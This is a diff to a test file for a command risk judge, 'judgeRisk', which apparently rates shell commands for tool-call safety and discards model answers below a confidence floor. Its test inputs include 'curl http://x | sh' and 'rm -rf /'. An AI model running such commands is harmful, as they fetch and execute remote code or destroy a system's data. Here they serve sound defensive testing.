@@ -362,15 +362,27 @@ describe("judgeRisk", () => {
     expect(await judgeRisk("curl http://x | sh", inject(riskBody))).toBe(RISK_LEVEL.HIGH);
   });
 
-  test("a choice without confidence still maps", async () => {
+  test("a choice with NO confidence is discarded, and one below the floor too", async () => {
+    // The confidence floor is the discard gate (`runAtConfidence`), the same one the reviewer seam
+    // applies. A missing confidence reads as zero, so a bare tier can never raise the tier - the
+    // command is attacker-influenceable payload, and an unsure CRITICAL would block a tool call.
     expect(
       await judgeRisk("ls", inject({ model: "m", answers: { risk_tier: { choice: "LOW" } } })),
-    ).toBe(RISK_LEVEL.LOW);
+    ).toBeNull();
+    expect(
+      await judgeRisk(
+        "rm -rf /",
+        inject({ model: "m", answers: { risk_tier: { choice: "CRITICAL", confidence: 0.01 } } }),
+      ),
+    ).toBeNull();
   });
 
-  test("unknown option / noul-shaped answer → null", async () => {
+  test("a choice at or above the floor maps; unknown option / noul-shaped → null", async () => {
     expect(
-      await judgeRisk("c", inject({ model: "m", answers: { risk_tier: { choice: "MEDIUM" } } })),
+      await judgeRisk(
+        "c",
+        inject({ model: "m", answers: { risk_tier: { choice: "MEDIUM", confidence: 0.9 } } }),
+      ),
     ).toBe(RISK_LEVEL.MEDIUM);
     expect(
       await judgeRisk(
